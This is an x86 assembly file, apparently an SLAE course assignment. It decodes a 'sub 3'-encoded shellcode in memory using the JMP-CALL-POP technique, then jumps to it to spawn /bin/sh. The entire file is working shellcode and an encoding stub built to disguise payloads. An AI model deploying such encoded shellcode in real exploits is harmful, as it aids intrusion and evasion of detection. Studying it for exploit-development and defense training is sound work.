; Filename: assignment4_sub-encoder.asm
; Author:  Marco Lugo (SLAE-1031)
; Description: decodes the "sub 3" encoded shellcode and executes it (launches /bin/sh)
;
; For the SecurityTube Linux Assembly Expert (SLAE) course
; Using the JMP-CALL-POP method, decodes the shellcode in memory by adding 3 to the byte value
; The resulting shellcode is 51 bytes

global _start

section .text

_start:
        jmp step1 ; unconditional jump to step1

step2:
        pop edx ; retrieves the address of Shellcode
        xor ecx, ecx ; assigns 0x00 to ECX
        mov cl, 0x19 ; assigns 25 to ECX
		xor ebx, ebx ; assigns 0x00 to EBX

decode:
        mov bl, byte [edx] ; copy the byte to decode into BL
        add bl, 0x03 ; decode the shellcode byte adding 0x03
		mov byte [edx], bl ; copy back the decoded byte into EDX
        inc edx ; move to the next byte in line to xor
        loop decode ; continue with the loop (jumps back to decode)

        jmp Shellcode ; with the shellcode now fully decoded, jump to it for execution

step1:
        call step2 ; jumps to step2 while pushing the address of Shellcode to the stack
        Shellcode: db 0x2e,0xbd,0x4d,0x65,0x6b,0x2c,0x70,0x65,0x65,0x2c,0x2c,0x5f,0x66,0x86,0xe0,0x4d,0x50,0x86,0xde,0x2e,0xcf,0xad,0x08,0xca,0x7d